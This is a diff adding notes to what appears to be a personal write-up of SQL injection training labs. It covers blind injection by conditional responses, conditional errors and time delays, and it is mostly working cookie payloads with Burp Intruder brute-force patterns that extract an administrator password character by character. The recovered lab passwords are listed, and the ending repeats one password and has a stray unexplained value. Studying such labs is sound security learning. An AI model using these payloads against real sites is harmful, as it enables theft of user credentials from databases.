@@ -85,3 +85,61 @@ PASSWORD_EZJBQY
 ?category=Gifts%27+UNION+SELECT+USERNAME_GIBQLT,PASSWORD_EZJBQY+FROM+USERS_TUEJNQ--+
 administrator / lpm52k
 ```
+
+## Blind SQL injection vulnerabilities
+
+### Blind SQL injection with conditional responses
+
+Determine password length:
+```
+TrackingId=a'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=6--;
+```
+
+Use Burp Suite Intruder (payload Brute-force `a-z0-9`) to get password one character at a time.
+If the server response contains `Welcome back` then we know we guessed the character correctly.
+```
+TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='§a§'--;
+TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,2,1)='§a§'--;
+TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,3,1)='§a§'--;
+...
+```
+Password is: `nqk8kg`
+
+### Blind SQL injection with conditional errors
+
+Determine password length:
+```
+TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)>6)+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;
+```
+
+Use Burp Suite Intruder to get password one character at a time.
+If the server responds with HTTP 500 then we know we guessed the character correctly.
+This time I used attack type `Cluster bomb` and set 2 payloads right away - the first payload was a simple
+number iterator and the second payload was Brute-force `a-z0-9`.
+```
+TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,§1§,1)='§a§')+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;
+```
+Password is: `2req0w`
+
+### Blind SQL injection with time delays
+```
+TrackingId=x'||pg_sleep(10)--
+```
+
+### Blind SQL injection with time delays and information retrieval
+
+Determine password length:
+```
+TrackingId=a'%3bselect+case+when+(username='administrator'+and+length(password)=6)+then+pg_sleep(5)+else+null+end+from+users--;
+```
+
+Use Burp Suite Intruder to get password one character at a time.
+If the server responds in more than 10 secs then we know guessed the character correctly.
+```
+TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,§1§,1)='§a§')+then+pg_sleep(10)+else+null+end+from+users--;
+```
+
+Password is: `2req0w`
+```
+bu15v4
+```
